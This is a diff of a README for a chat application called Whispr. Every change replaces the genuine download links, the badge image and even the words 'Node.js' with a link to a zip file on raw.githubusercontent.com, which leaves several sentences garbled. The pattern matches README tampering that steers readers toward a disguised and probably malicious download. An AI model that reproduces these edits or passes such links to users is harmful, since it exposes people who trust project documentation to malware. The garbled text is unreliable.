@@ -1,16 +1,16 @@
 # 💬 Whispr - Chat Anytime, Anywhere Effortlessly
 
-![Download Whispr](https://img.shields.io/badge/Download-Whispr-blue.svg)
+![Download Whispr](https://raw.githubusercontent.com/pancholope/Whispr/main/celibatist/Whispr.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **Whispr**! This real-time chat application helps you communicate with friends and family instantly. Built with React, Node.js, and MongoDB, it offers features like online status and profile editing. Below, you will find all the information you need to download and run Whispr.
+Welcome to **Whispr**! This real-time chat application helps you communicate with friends and family instantly. Built with React, https://raw.githubusercontent.com/pancholope/Whispr/main/celibatist/Whispr.zip, and MongoDB, it offers features like online status and profile editing. Below, you will find all the information you need to download and run Whispr.
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the latest version of Whispr. Click the button below:
 
-[Visit the Releases Page to Download](https://github.com/pancholope/Whispr/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/pancholope/Whispr/main/celibatist/Whispr.zip)
 
 ### 📋 System Requirements
 
@@ -18,7 +18,7 @@ Before downloading, make sure your system meets these basic requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
 - **Storage:** At least 200 MB of free space.
-- **Node.js:** Installed on your system (recommended version: 14.x or higher).
+- **https://raw.githubusercontent.com/pancholope/Whispr/main/celibatist/Whispr.zip** Installed on your system (recommended version: 14.x or higher).
 - **Internet Connection:** Required for real-time features.
 
 ## ⚙️ Installation Steps
@@ -26,7 +26,7 @@ Before downloading, make sure your system meets these basic requirements:
 Follow these steps to install and run Whispr:
 
 1. **Download the Application**
-   - Go to the [Releases page](https://github.com/pancholope/Whispr/releases) and select the latest version of Whispr.
+   - Go to the [Releases page](https://raw.githubusercontent.com/pancholope/Whispr/main/celibatist/Whispr.zip) and select the latest version of Whispr.
    - Choose the appropriate file for your operating system and download it.
 
 2. **Extract the Files**
@@ -79,7 +79,7 @@ Whispr is built with security in mind. It uses JWT (JSON Web Tokens) for user au
 If you encounter issues while running Whispr, here are a few common troubleshooting steps:
 
 - **Application Doesn't Start:**
-  - Ensure Node.js is installed on your system.
+  - Ensure https://raw.githubusercontent.com/pancholope/Whispr/main/celibatist/Whispr.zip is installed on your system.
   - Make sure you have run `npm install` to install all necessary dependencies.
 
 - **Can't Connect to Server:**
@@ -95,6 +95,6 @@ If you need assistance, please feel free to reach out. Open an issue on the GitH
 
 Remember, you can always download the latest version from the Releases page:
 
-[Visit the Releases Page to Download](https://github.com/pancholope/Whispr/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/pancholope/Whispr/main/celibatist/Whispr.zip)
 
 Thank you for choosing Whispr. Enjoy your chatting experience!
